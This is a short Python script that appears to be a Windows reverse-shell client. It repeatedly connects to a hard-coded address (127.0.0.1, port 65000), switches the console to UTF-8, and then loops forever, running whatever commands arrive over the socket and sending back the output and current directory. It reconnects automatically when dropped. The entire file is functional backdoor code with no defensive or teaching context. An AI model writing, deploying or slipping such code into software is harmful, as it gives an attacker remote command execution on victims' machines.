# from legend import client_legacy
import os
import socket, time
import subprocess

def waiting(s=None, creds=()):
    del s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(creds)
    except:
        s.close()
        s = waiting(s=s, creds=creds)
        return s
    else:
        return s


shell_addr = ("127.0.0.1", 65000)
ip = shell_addr[0]

# s = waiting(creds=shell_addr)
s = None
while s == None or s.fileno() == -1:
    try:
        del s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(shell_addr)
    except ConnectionRefusedError:
        s.close()

os.system("chcp 65001")

while True:
    com = s.recv(1024).decode('cp65001')
    try:
        ans = subprocess.getoutput(com)
        s.send(ans.encode("cp65001"))
        s.send(subprocess.getoutput('cd').encode('cp65001'))
    except:
        s.close()
        s = waiting(creds=shell_addr)
